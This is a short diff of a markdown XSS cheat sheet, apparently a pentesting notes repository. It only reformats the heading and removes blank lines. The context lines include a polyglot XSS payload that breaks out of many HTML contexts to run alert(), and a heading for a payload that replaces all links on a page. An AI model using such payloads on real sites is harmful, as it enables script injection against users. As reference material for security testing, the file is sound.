@@ -1,4 +1,4 @@
-# XSS
+<center> # XSS </center>
 
 Few famous XSS tool
 
@@ -8,8 +8,6 @@ Few famous XSS tool
 ```
 %0ajavascript:`/*\"/*-->&lt;svg onload='/*</template></noembed></noscript></style></title></textarea></script><html onmouseover="/**/ alert()//'">`
 ```
-
-
 
 
 **Payload to replace all links**
